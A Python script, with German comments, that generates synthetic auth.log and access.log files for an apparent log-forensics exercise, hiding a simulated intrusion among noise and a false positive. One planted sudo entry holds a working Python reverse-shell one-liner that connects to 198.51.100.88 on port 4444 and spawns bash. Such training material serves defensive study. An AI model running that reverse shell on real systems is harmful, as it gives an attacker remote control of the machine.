import random
from datetime import datetime, timedelta

start_time = datetime(2026, 7, 22, 1, 0, 0)
noise_ips = ["192.168.1.45", "10.0.0.12", "172.16.4.99", "203.0.113.5", "198.51.100.23"]
scanner_ips = ["45.154.255.19", "185.220.101.5", "194.26.29.116"]

auth_logs = []
access_logs = []

# ==========================================
# 1. AUTH.LOG GENERIEREN (Mit False Positives)
# ==========================================

for i in range(70):
    t = start_time + timedelta(seconds=random.randint(1, 10000))
    ip = random.choice(noise_ips)
    auth_logs.append((t, f"{t.strftime('%b %d %H:%M:%S')} initech-srv01 sshd[{random.randint(1000,9999)}]: Failed password for invalid user root from {ip} port {random.randint(40000,65000)} ssh2"))

fp_time = datetime(2026, 7, 22, 2, 45, 12)
auth_logs.append((fp_time, f"{fp_time.strftime('%b %d %H:%M:%S')} initech-srv01 sudo:   peter.gibbons : TTY=pts/1 ; PWD=/home/peter.gibbons ; USER=root ; COMMAND=/usr/local/bin/internal_scanner.py --force-wipe"))

attacker_ip = "198.51.100.88"
attacker_user = "milton"
attack_time = datetime(2026, 7, 22, 3, 15, 42)
t_str = attack_time.strftime("%b %d %H:%M:%S")

auth_logs.append((attack_time, f"{t_str} initech-srv01 sshd[{random.randint(1000,9999)}]: Accepted password for {attacker_user} from {attacker_ip} port 49152 ssh2"))
auth_logs.append((attack_time + timedelta(seconds=1), f"{t_str} initech-srv01 sshd[{random.randint(1000,9999)}]: pam_unix(sshd:session): session opened for user {attacker_user} by (uid=0)"))

cmd_time = attack_time + timedelta(seconds=8)
c_str = cmd_time.strftime("%b %d %H:%M:%S")
rev_shell = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.88\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
auth_logs.append((cmd_time, f"{c_str} initech-srv01 sudo:   {attacker_user} : TTY=pts/3 ; PWD=/home/{attacker_user} ; USER=root ; COMMAND={rev_shell}"))

for i in range(50):
    t = attack_time + timedelta(seconds=random.randint(30, 5000))
    auth_logs.append((t, f"{t.strftime('%b %d %H:%M:%S')} initech-srv01 CRON[{random.randint(1000,9999)}]: (www-data) CMD (/usr/local/bin/backup.sh)"))


# ==========================================
# 2. ACCESS.LOG GENERIEREN (Web-Traffic & Entry)
# ==========================================

for i in range(60):
    t = start_time + timedelta(seconds=random.randint(1, 10000))
    s_ip = random.choice(scanner_ips)
    access_logs.append((t, f'{s_ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /admin/config.php HTTP/1.1" 403 192'))

web_attack_time = attack_time - timedelta(seconds=35)
access_logs.append((web_attack_time, f'{attacker_ip} - - [{web_attack_time.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/v1/login.php HTTP/1.1" 200 542 "{attacker_ip}" "Mozilla/5.0 (X11; Linux x86_64)"'))

auth_logs.sort(key=lambda x: x[0])
access_logs.sort(key=lambda x: x[0])

with open("auth.log", "w") as f:
    for _, line in auth_logs:
        f.write(line + "\n")

with open("access.log", "w") as f:
    for _, line in access_logs:
        f.write(line + "\n")

print("[+] Fortgeschrittene Logs (auth.log + access.log mit False Positives) erfolgreich erstellt!")